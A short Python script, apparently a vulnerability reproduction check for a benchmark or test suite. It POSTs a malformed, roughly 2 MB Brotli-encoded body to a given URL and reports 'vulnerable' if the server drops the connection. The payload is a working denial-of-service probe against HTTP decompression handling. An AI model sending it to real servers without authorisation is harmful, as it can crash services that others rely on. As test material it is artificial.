#!/usr/bin/env python3
"""Opaque payload (owner-authored). Inbound Content-Encoding: br differential.
usage: br-behavior.py <variant> <base_url>
Emits raw evidence to stdout, then exactly one VERDICT line."""
import sys, socket, urllib.request, urllib.error

variant, url = sys.argv[1], sys.argv[2].rstrip("/") + "/"
body = b"\x9b\x06\x80" + b"\xff" * 2_000_000 + b"\x03"  # malformed oversized br stream
req = urllib.request.Request(url, data=body, method="POST",
                             headers={"Content-Encoding": "br",
                                      "Content-Type": "application/octet-stream"})
try:
    with urllib.request.urlopen(req, timeout=10) as r:
        print("RESPONSE status=%s body=%r" % (r.status, r.read(200)))
        resp = True
except urllib.error.HTTPError as e:
    print("RESPONSE http-error status=%s" % e.code)
    resp = True
except (urllib.error.URLError, socket.timeout, ConnectionError, OSError) as e:
    print("TORN %r" % (getattr(e, "reason", None) or e))
    resp = False

if not resp:
    print("# VERDICT: vulnerable connection torn on br request")
elif variant == "patched":
    print("# VERDICT: not-vulnerable clean response on patched half")
else:
    print("# VERDICT: inconclusive no crash on vulnerable half (stream shape)")
